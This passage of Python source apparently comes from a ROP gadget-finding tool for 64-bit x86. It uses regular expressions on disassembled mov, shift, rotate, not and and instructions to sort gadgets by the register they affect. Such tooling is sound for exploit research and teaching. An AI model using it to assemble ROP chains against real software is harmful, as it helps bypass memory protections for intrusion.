			# if not re.match( r'^mov [er]*a[x|l]+, [dword|qword|byte|word]+ [ptr]* \[[er]*a[x|l|h]*|^mov [er]*b[x|l]+, [dword|qword|byte|word]+ [ptr]* \[[er]*b[x|l|h]+|^mov [er]*c[x|l]+, [dword|qword|byte|word]+ [ptr]* \[[er]*c[x|l|h]*|^mov [er]*d[x|l|h]+, [dword|qword|byte|word]+ [ptr]* \[[er]*d[x|l|h]+|^mov [er]*di, [dword|qword|byte|word]+ [ptr]* \[[er]*di|^mov [er]*si, [dword|qword|byte|word]+ [ptr]* \[[er]*si|^mov [er]*sp, [dword|qword|byte|word]+ [ptr]* \[[er]*sp|^mov [er]*bp, [dword|qword|byte|word]+ [ptr]* \[[er]*bp|mov [er]*a[x|l]+, [er]*a[x|l|h]+|mov [er]*b[x|l]+, [er]*b[x|l|h]+|mov [er]*c[x|l|h]+, [er]*c[x|l|h]+|mov [er]*d[x|l]+, [er]*d[x|l|h]+|mov [er]*di, [er]*di|mov [er]*si, [er]*si|mov [er]*bp, [er]*bp+|mov [er]*sp, [er]*sp|^mov [er]*a[x|l]+, [dword|qword|byte|word]+ [ptr]* \[[er]*a[x|l|h] [+|-]+|^mov [dword|qword|byte|word]+ ptr \[[er]*[abcdspb01234589]+[x|l|h|i|p]* [+|-]+ |^mov [er]*[abcdspb01234589]+[x|l|i|p]+, [dword|qword|byte|word]+ ptr \[0x|^mov [er]*a[x|l]+, [dword|qword|byte|word]+ [ptr]* \[[er]*a[x|l|h]+ [+|-]+|^mov [er]*[abcdspb01234589]+[x|l|i|p]+, es', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.mov64)
			if re.match( r'^mov [er]*a[x|l]+, [er]*[abcdspb01234589]+[x|l|h|i|p]*', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rax", fg.movRAX)
			elif re.match( r'^mov [er]*b[x|l]+, [er]*[abcdspb01234589]+[x|l|h|i|p]*', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbx", fg.movRBX)
			elif re.match( r'^mov [er]*c[x|l]+, [er]*[abcdspb01234589]+[x|l|h|i|p]*', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rcx", fg.movRCX)
			elif re.match( r'^mov [er]*d[x|l]+, [er]*[abcdspb01234589]+[x|l|h|i|p]*', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.movRDX)
			elif re.match( r'^mov [er]*si, [er]*[abcdspb01234589]+[x|l|h|i|p]*', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsi", fg.movRSI)
			elif re.match( r'^mov [er]*di, [er]*[abcdspb01234589]+[x|l|h|i|p]*', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdi", fg.movRDI)
			elif re.match( r'^mov [er]*sp, [er]*[abcdspb01234589]+[x|l|h|i|p]*', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsp", fg.movRSP)
			elif re.match( r'^mov [er]*bp, [er]*[abcdspb01234589]+[x|l|h|i|p]*', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.movRBP)
			elif re.match( r'^mov r8, [er]*[abcdspb01234589]+[x|l|h|i|p]*', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r8", fg.movR8)
			elif re.match( r'^mov r9, [er]*[abcdspb01234589]+[x|l|h|i|p]*', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r9", fg.movR9)
			elif re.match( r'^mov r10, [er]*[abcdspb01234589]+[x|l|h|i|p]*', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r10", fg.movR10)
			elif re.match( r'^mov r11, [er]*[abcdspb01234589]+[x|l|h|i|p]*', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r11", fg.movR11)
			elif re.match( r'^mov r12, [er]*[abcdspb01234589]+[x|l|h|i|p]*', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r12", fg.movR12)
			elif re.match( r'^mov r13, [er]*[abcdspb01234589]+[x|l|h|i|p]*', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r13", fg.movR13)
			elif re.match( r'^mov r14, [er]*[abcdspb01234589]+[x|l|h|i|p]*', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r14", fg.movR14)
			elif re.match( r'^mov r15, [er]*[abcdspb01234589]+[x|l|h|i|p]*', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r15", fg.movR15)	
		
		elif re.match( r'^mov [er]*[abcds01234589]+[xlspbi]+, [qword|dword]+ ptr \[[er]*[abcdspb01234589]+[x|l|h|i|p]*', testVal, re.M|re.I):
			# if not re.match( r'^mov [er]*a[x|l]+, [dword|qword|byte|word]+ [ptr]* \[[er]*a[x|l|h]*|^mov [er]*b[x|l]+, [dword|qword|byte|word]+ [ptr]* \[[er]*b[x|l|h]+|^mov [er]*c[x|l]+, [dword|qword|byte|word]+ [ptr]* \[[er]*c[x|l|h]*|^mov [er]*d[x|l|h]+, [dword|qword|byte|word]+ [ptr]* \[[er]*d[x|l|h]+|^mov [er]*di, [dword|qword|byte|word]+ [ptr]* \[[er]*di|^mov [er]*si, [dword|qword|byte|word]+ [ptr]* \[[er]*si|^mov [er]*sp, [dword|qword|byte|word]+ [ptr]* \[[er]*sp|^mov [er]*bp, [dword|qword|byte|word]+ [ptr]* \[[er]*bp|mov [er]*a[x|l]+, [er]*a[x|l|h]+|mov [er]*b[x|l]+, [er]*b[x|l|h]+|mov [er]*c[x|l|h]+, [er]*c[x|l|h]+|mov [er]*d[x|l]+, [er]*d[x|l|h]+|mov [er]*di, [er]*di|mov [er]*si, [er]*si|mov [er]*bp, [er]*bp+|mov [er]*sp, [er]*sp|^mov [er]*a[x|l]+, [dword|qword|byte|word]+ [ptr]* \[[er]*a[x|l|h] [+|-]+|^mov [dword|qword|byte|word]+ ptr \[[er]*[abcdspb01234589]+[x|l|h|i|p]* [+|-]+ |^mov [er]*[abcdspb01234589]+[x|l|i|p]+, [dword|qword|byte|word]+ ptr \[0x|^mov [er]*a[x|l]+, [dword|qword|byte|word]+ [ptr]* \[[er]*a[x|l|h]+ [+|-]+|^mov [er]*[abcdspb01234589]+[x|l|i|p]+, es', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.movQword2)
			#   mov eax, [qword|dword]+ ptr [eax]
			if re.match( r'^mov [er]*a[x|l]+, [qword|dword]+ ptr \[[er]*[abcdspb01234589]+[x|l|h|i|p]*', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rax", fg.movQword2RAX)
			elif re.match( r'^mov [er]*b[x|l]+, [qword|dword]+ ptr \[[er]*[abcdspb01234589]+[x|l|h|i|p]*', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbx", fg.movQword2RBX)
			elif re.match( r'^mov [er]*c[x|l]+, [qword|dword]+ ptr \[[er]*[abcdspb01234589]+[x|l|h|i|p]*', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rcx", fg.movQword2RCX)
			elif re.match( r'^mov [er]*d[x|l]+, [qword|dword]+ ptr \[[er]*[abcdspb01234589]+[x|l|h|i|p]*', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.movQword2RDX)
			elif re.match( r'^mov [er]*si, [qword|dword]+ ptr \[[er]*[abcdspb01234589]+[x|l|h|i|p]*', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsi", fg.movQword2RSI)
			elif re.match( r'^mov [er]*di, [qword|dword]+ ptr \[[er]*[abcdspb01234589]+[x|l|h|i|p]*', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdi", fg.movQword2RDI)
			elif re.match( r'^mov [er]*sp, [qword|dword]+ ptr \[[er]*[abcdspb01234589]+[x|l|h|i|p]*', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsp", fg.movQword2RSP)
			elif re.match( r'^mov [er]*bp, [qword|dword]+ ptr \[[er]*[abcdspb01234589]+[x|l|h|i|p]*', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.movQword2RBP)
			elif re.match( r'^mov r8, [qword|dword]+ ptr', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r8", fg.movQword2R8)
			elif re.match( r'^mov r9, [qword|dword]+ ptr', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r9", fg.movQword2R9)
			elif re.match( r'^mov r10, [qword|dword]+ ptr', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r10", fg.movQword2R10)
			elif re.match( r'^mov r11, [qword|dword]+ ptr', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r11", fg.movQword2R11)
			elif re.match( r'^mov r12, [qword|dword]+ ptr', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r12", fg.movQword2R12)
			elif re.match( r'^mov r13, [qword|dword]+ ptr', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r13", fg.movQword2R13)
			elif re.match( r'^mov r14, [qword|dword]+ ptr', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r14", fg.movQword2R14)
			elif re.match( r'^mov r15, [qword|dword]+ ptr', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r15", fg.movQword2R15)	
		elif re.match( r'^mov [er]*[abcds]+[xlspbi]+, [0-9]*[0x]*[0-9a-f]+', testVal, re.M|re.I):
			# if not re.match( r'^mov [er]*a[x|l]+, [dword|qword|byte|word]+ [ptr]* \[[er]*a[x|l|h]*|^mov [er]*b[x|l]+, [dword|qword|byte|word]+ [ptr]* \[[er]*b[x|l|h]+|^mov [er]*c[x|l]+, [dword|qword|byte|word]+ [ptr]* \[[er]*c[x|l|h]*|^mov [er]*d[x|l|h]+, [dword|qword|byte|word]+ [ptr]* \[[er]*d[x|l|h]+|^mov [er]*di, [dword|qword|byte|word]+ [ptr]* \[[er]*di|^mov [er]*si, [dword|qword|byte|word]+ [ptr]* \[[er]*si|^mov [er]*sp, [dword|qword|byte|word]+ [ptr]* \[[er]*sp|^mov [er]*bp, [dword|qword|byte|word]+ [ptr]* \[[er]*bp|mov [er]*a[x|l]+, [er]*a[x|l|h]+|mov [er]*b[x|l]+, [er]*b[x|l|h]+|mov [er]*c[x|l|h]+, [er]*c[x|l|h]+|mov [er]*d[x|l]+, [er]*d[x|l|h]+|mov [er]*di, [er]*di|mov [er]*si, [er]*si|mov [er]*bp, [er]*bp+|mov [er]*sp, [er]*sp|^mov [er]*a[x|l]+, [dword|qword|byte|word]+ [ptr]* \[[er]*a[x|l|h] [+|-]+|^mov [dword|qword|byte|word]+ ptr \[[er]*[abcdspb]+[x|l|h|i|p]+ [+|-]+ |^mov [er]*[abcdspb]+[x|l|i|p]+, [dword|qword|byte|word]+ ptr \[0x|^mov [er]*a[x|l]+, [dword|qword|byte|word]+ [ptr]* \[[er]*a[x|l|h]+ [+|-]+|^mov [er]*[abcdspb]+[x|l|i|p]+, es', testVal, re.M|re.I):
			#add
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.movConstant64)
			if re.match( r'^mov [er]*a[x|l]+, [0-9]*[0x]*[0-9a-f]+', testVal, re.M|re.I):
				if not re.match( r'^mov [er]*ax, [er]*[abcds]+[xipb]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rax", fg.movConstantRAX)
			elif re.match( r'^mov [er]*b[x|l]+, [0-9]*[0x]*[0-9a-f]+', testVal, re.M|re.I):
				if not re.match( r'^mov [er]*bx, [er]*[abcds]+[xipb]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbx", fg.movConstantRBX)
			elif re.match( r'^mov [er]*c[x|l]+, [0-9]*[0x]*[0-9a-f]+', testVal, re.M|re.I):
				if not re.match( r'^mov [er]*cx, [er]*[abcds]+[xipb]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rcx", fg.movConstantRCX)
			elif re.match( r'^mov [er]*d[x|l]+, [0-9]*[0x]*[0-9a-f]+', testVal, re.M|re.I):
				if not re.match( r'^mov [er]*dx, [er]*[abcds]+[xipb]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.movConstantRDX)
			elif re.match( r'^mov [er]*si, [0-9]*[0x]*[0-9a-f]+', testVal, re.M|re.I):
				if not re.match( r'^mov [er]*si, [er]*[abcds]+[xipb]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsi", fg.movConstantRSI)
			elif re.match( r'^mov [er]*di, [0-9]*[0x]*[0-9a-f]+', testVal, re.M|re.I):
				if not re.match( r'^mov [er]*di, [er]*[abcds]+[xipb]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdi", fg.movConstantRDI)
			elif re.match( r'^mov [er]*sp, [0-9]*[0x]*[0-9a-f]+', testVal, re.M|re.I):
				if not re.match( r'^mov [er]*sp, [er]*[abcds]+[xipb]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsp", fg.movConstantRSP)
			elif re.match( r'^mov [er]*bp, [0-9]*[0x]*[0-9a-f]+', testVal, re.M|re.I):
				if not re.match( r'^mov [er]*bp, [er]*[abcds]+[xipb]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.movConstantRBP)
			elif re.match( r'^mov r8[bdw]*, [0-9]*[0x]*[0-9a-f]+', testVal, re.M|re.I):
				if not re.match( r'^mov r8, [er]*[abcds]+[xipb]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r8", fg.movConstantR8)
			elif re.match( r'^mov r9[bdw]*, [0-9]*[0x]*[0-9a-f]+', testVal, re.M|re.I):
				if not re.match( r'^mov r9, [er]*[abcds]+[xipb]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r9", fg.movConstantR9)
			elif re.match( r'^mov r10[bdw]*, [0-9]*[0x]*[0-9a-f]+', testVal, re.M|re.I):
				if not re.match( r'^mov r10, [er]*[abcds]+[xipb]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r10", fg.movConstantR10)
			elif re.match( r'^mov r11[bdw]*, [0-9]*[0x]*[0-9a-f]+', testVal, re.M|re.I):
				if not re.match( r'^mov r11, [er]*[abcds]+[xipb]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r11", fg.movConstantR11)
			elif re.match( r'^mov r12[bdw]*, [0-9]*[0x]*[0-9a-f]+', testVal, re.M|re.I):
				if not re.match( r'^mov r12, [er]*[abcds]+[xipb]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r12", fg.movConstantR12)
			elif re.match( r'^mov r13[bdw]*, [0-9]*[0x]*[0-9a-f]+', testVal, re.M|re.I):
				if not re.match( r'^mov r13, [er]*[abcds]+[xipb]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r13", fg.movConstantR13)
			elif re.match( r'^mov r14[bdw]*, [0-9]*[0x]*[0-9a-f]+', testVal, re.M|re.I):
				if not re.match( r'^mov r14, [er]*[abcds]+[xipb]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r14", fg.movConstantR14)
			elif re.match( r'^mov r15[bdw]*, [0-9]*[0x]*[0-9a-f]+', testVal, re.M|re.I):
				if not re.match( r'^mov r15, [er]*[abcds]+[xipb]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r15", fg.movConstantR15)

		#mov dword
		# elif re.match( r'^mov [qword|dword]+ ptr \[[er]*', testVal, re.M|re.I):
		elif "ptr" in testVal:
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.movQword)
			if re.match( r'^mov [qword|dword]+ ptr \[[er]*a[x|l]+.*\], [er]*[abcdsb01234589]+|^mov [qword|dword]+ ptr \[[er]*a[x|l]+.*\], [dword|qword|word|byte]* ptr \[[er]*[abcdsb01234589]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rax", fg.movQwordRAX)
			elif re.match( r'^mov [qword|dword]+ ptr \[[er]*b[x|l]+.*\], [er]*[abcdsb01234589]+|^mov [qword|dword]+ ptr \[[er]*b[x|l]+.*\], [dword|qword|word|byte]* ptr \[[er]*[abcdsb01234589]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbx", fg.movQwordRBX)
			elif re.match( r'^mov [qword|dword]+ ptr \[[er]*c[x|l]+.*\], [er]*[abcdsb01234589]+|^mov [qword|dword]+ ptr \[[er]*c[x|l]+.*\], [dword|qword|word|byte]* ptr \[[er]*[abcdsb01234589]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rcx", fg.movQwordRCX)
			elif re.match( r'^mov [qword|dword]+ ptr \[[er]*d[x|l]+.*\], [er]*[abcdsb01234589]+|^mov [qword|dword]+ ptr \[[er]*d[x|l]+.*\], [dword|qword|word|byte]* ptr \[[er]*[abcdsb01234589]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.movQwordRDX)
			elif re.match( r'^mov [qword|dword]+ ptr \[[er]*di.*\], [er]*[abcdsb01234589]+|^mov [qword|dword]+ ptr \[[er]*di.*\], [dword|qword|word|byte]* ptr \[[er]*[abcdsb01234589]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdi", fg.movQwordRDI)
			elif re.match( r'^mov [qword|dword]+ ptr \[[er]*si.*\], [er]*[abcdsb01234589]+|^mov [qword|dword]+ ptr \[[er]*si.*\], [dword|qword|word|byte]* ptr \[[er]*[abcdsb01234589]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsi", fg.movQwordRSI)
			elif re.match( r'^mov [qword|dword]+ ptr \[[er]*bp.*\], [er]*[abcdsb01234589]+|^mov [qword|dword]+ ptr \[[er]*bp.*\], [dword|qword|word|byte]* ptr \[[er]*[abcdsb01234589]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.movQwordRBP)
			elif re.match( r'^mov [qword|dword]+ ptr \[[er]*sp.*\], [er]*[abcdsb01234589]+|^mov [qword|dword]+ ptr \[[er]*sp.*\], [dword|qword|word|byte]* ptr \[[er]*[abcdsb01234589]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsp", fg.movQwordRSP)
			elif re.match( r'^mov [qword|dword]+ ptr \[r8.*\], [er]*[abcdsb01234589]+|^mov [qword|dword]+ ptr \[r8.*\], [dword|qword|word|byte]* ptr \[[er]*[abcdsb01234589]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r8", fg.movR8)
			elif re.match( r'^mov [qword|dword]+ ptr \[r9.*\], [er]*[abcdsb01234589]+|^mov [qword|dword]+ ptr \[r9.*\], [dword|qword|word|byte]* ptr \[[er]*[abcdsb01234589]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r9", fg.movR9)
			elif re.match( r'^mov [qword|dword]+ ptr \[r10.*\], [er]*[abcdsb01234589]+|^mov [qword|dword]+ ptr \[r10.*\], [dword|qword|word|byte]* ptr \[[er]*[abcdsb01234589]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r10", fg.movR10)
			elif re.match( r'^mov [qword|dword]+ ptr \[r11.*\], [er]*[abcdsb01234589]+|^mov [qword|dword]+ ptr \[r11.*\], [dword|qword|word|byte]* ptr \[[er]*[abcdsb01234589]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r11", fg.movR11)
			elif re.match( r'^mov [qword|dword]+ ptr \[r12.*\], [er]*[abcdsb01234589]+|^mov [qword|dword]+ ptr \[r12.*\], [dword|qword|word|byte]* ptr \[[er]*[abcdsb01234589]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r12", fg.movR12)
			elif re.match( r'^mov [qword|dword]+ ptr \[r13.*\], [er]*[abcdsb01234589]+|^mov [qword|dword]+ ptr \[r13.*\], [dword|qword|word|byte]* ptr \[[er]*[abcdsb01234589]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r13", fg.movR13)
			elif re.match( r'^mov [qword|dword]+ ptr \[r14.*\], [er]*[abcdsb01234589]+|^mov [qword|dword]+ ptr \[r14.*\], [dword|qword|word|byte]* ptr \[[er]*[abcdsb01234589]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r14", fg.movR14)
			elif re.match( r'^mov [qword|dword]+ ptr \[r15.*\], [er]*[abcdsb01234589]+|^mov [qword|dword]+ ptr \[r15.*\], [dword|qword|word|byte]* ptr \[[er]*[abcdsb01234589]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r15", fg.movR15)	
		if "gs:[e" in testVal or "gs:[0xc0]" in testVal:
			if re.match( r'^mov [er]*[abcdsibpbx]+, [qword|dword]+ ptr gs', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsp", fg.movGSSpecial)


	def do64_popal(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.popal64)
	def do64_popad(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		self.do64_popal(testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL,  op_strL, c2)
	
	def do64_pushal(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.pushad64)
	def do64_pushad(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		self.do64_pushal(testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL,  op_strL, c2)
	
	def do64_sal(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		self.do64_shl(testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL,  op_strL, c2)

	def do64_shl(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		if "ptr" in testVal:
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.shlQword)
		else:
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.shl64)

	def do64_shr(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		if "ptr" in testVal:
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.shrQword)
		else:
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.shr64)


	def do64_sar(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		self.do64_shr(testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL,  op_strL, c2)


	def do64_rcr(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		if "ptr" in testVal:
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.rcrQword)
		else:
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.rcr64)

	def do64_ror(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		self.do64_rcr(testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL,  op_strL, c2)

	def do64_rcl(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		if "ptr" in testVal:
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.rclQword)
		else:
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.rcl64)

	def do64_rol(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		self.do64_rcl(testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL,  op_strL, c2)

	def do64_not(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.notInst64)
		if re.match( r'^not [er]*a[x|l|h]+', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rax", fg.notInstRAX)
		elif re.match( r'^not [er]*b[x|l|h]+', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbx", fg.notInstRBX)
		elif re.match( r'^not [er]*c[x|l|h]+', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rcx", fg.notInstRCX)
		elif re.match( r'^not [er]*d[x|l|h]+', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.notInstRDX)
		elif re.match( r'^not [er]*si', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsi", fg.notInstRSI)
		elif re.match( r'^not [er]*di', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdi", fg.notInstRDI)
		elif re.match( r'not [er]*sp', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsp", fg.notInstRSP)
		elif re.match( r'^not [er]*bp', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.notInstRBP)
		elif re.match( r'^not r8', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r8", fg.notInstR8)
		elif re.match( r'^not r9', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r9", fg.notInstR9)
		elif re.match( r'^not r10', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r10", fg.notInstR10)
		elif re.match( r'^not r11', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r11", fg.notInstR11)
		elif re.match( r'^not r12', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r12", fg.notInstR12)
		elif re.match( r'^not r13', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r13", fg.notInstR13)
		elif re.match( r'^not r14', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r14", fg.notInstR14)
		elif re.match( r'^not r15', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r15", fg.notInstR15)	

	def do64_and(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.andInst64)
		if re.match( r'^and [er]*a[x|l|h]+', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rax", fg.andInstRAX)
		elif re.match( r'^and [er]*b[x|l|h]+', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbx", fg.andInstRBX)
		elif re.match( r'^and [er]*c[x|l|h]+', testVal, re.M|re.I):
